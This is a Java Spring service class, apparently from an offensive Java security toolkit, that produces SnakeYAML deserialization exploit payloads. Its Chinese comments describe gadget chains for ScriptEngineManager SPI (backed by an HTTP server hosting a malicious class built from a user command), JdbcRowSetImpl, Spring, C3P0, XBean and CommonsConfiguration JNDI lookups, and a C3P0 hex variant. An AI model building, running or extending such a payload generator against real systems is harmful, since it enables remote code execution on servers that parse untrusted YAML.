package com.xyuxu.javasec.service;

import com.xyuxu.javasec.core.generator.SnakeYamlPayloadGenerator;
import com.xyuxu.javasec.dto.SnakeYamlRequest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.StringUtils;

import java.net.URL;
import java.util.Arrays;
import java.util.List;

@Service
public class SnakeYamlService {

    // 下拉框列表：保持与 Switch Case 中的字符串完全一致
    public static final List<String> SUPPORTED_TYPES = Arrays.asList(
            "ScriptEngineManager (SPI)",      // HTTP 远程加载
            "JdbcRowSetImpl (JNDI)",          // JDK 原生
            "SpringPropertyPath (JNDI)",      // Spring 依赖
            "SpringJtaTransactionManager (JNDI)", // Spring 依赖
            "C3P0 (JNDI)",                    // C3P0 依赖
            "C3P0 (Hex)",                     // C3P0 + 反序列化 Hex
            "XBean (JNDI)",                   // Apache XBean
            "CommonsConfiguration (JNDI)"     // Commons Config
    );

    @Autowired
    private SPIExploitService spiExploitService;

    public String generate(SnakeYamlRequest req) throws Exception {
        String ip=req.getIp();
        String type = req.getType();
        String command = req.getCommand();
        String jndiUrl = req.getJndiUrl();

        if (!StringUtils.hasText(type)) {
            throw new Exception("请选择 Payload 类型");
        }

        // ==========================================
        // 场景 1: ScriptEngineManager (SPI 模式)
        // 逻辑: 开启 HTTP 服务 -> 解析 URL -> 生成 Payload
        // ==========================================
        if ("ScriptEngineManager (SPI)".equals(type)) {
            if (!StringUtils.hasText(command)) {
                throw new Exception("SPI 模式需要填写 [Command] 以生成恶意类");
            }

            // 1. 启动或刷新后端 HTTP 服务，获取服务地址
            String serviceUrlStr = spiExploitService.refreshAndGetUrl(ip,command);
            // 2. 解析 URL 中的 IP 和 端口
            URL url = new URL(serviceUrlStr);
            return SnakeYamlPayloadGenerator.generateScriptEngineManager(url.getHost(), url.getPort());
        }

        // ==========================================
        // 场景 2: C3P0 Hex (特殊模式)
        // 逻辑: 复用 Command 字段接收 Hex 字符串
        // ==========================================
        else if ("C3P0 (Hex)".equals(type)) {
            if (!StringUtils.hasText(command)) {
                throw new Exception("C3P0 (Hex) 模式需要在 [Command] 框中填入恶意序列化数据的 Hex 字符串");
            }
            // 这里的 command 实际上是 Hex 字符串
            return SnakeYamlPayloadGenerator.generateC3P0Hex(command.trim());
        }

        // ==========================================
        // 场景 3: 标准 JNDI 模式
        // 逻辑: 校验 JNDI URL -> 生成 Payload
        // ==========================================
        else {
            if (!StringUtils.hasText(jndiUrl)) {
                throw new Exception("该模式需要填写 [JNDI URL] (请从 JNDI 模块复制)");
            }
            String url = jndiUrl.trim();

            switch (type) {
                case "JdbcRowSetImpl (JNDI)":
                    return SnakeYamlPayloadGenerator.generateJdbcRowSetImpl(url);

                case "SpringPropertyPath (JNDI)":
                    return SnakeYamlPayloadGenerator.generateSpringPropertyPath(url);

                case "SpringJtaTransactionManager (JNDI)":
                    return SnakeYamlPayloadGenerator.generateSpringJtaTransactionManager(url);

                case "C3P0 (JNDI)":
                    return SnakeYamlPayloadGenerator.generateC3P0Jndi(url);

                case "XBean (JNDI)":
                    return SnakeYamlPayloadGenerator.generateXBean(url);

                case "CommonsConfiguration (JNDI)":
                    return SnakeYamlPayloadGenerator.generateCommonsConfiguration(url);

                default:
                    throw new Exception("后端暂不支持该类型: " + type);
            }
        }
    }
}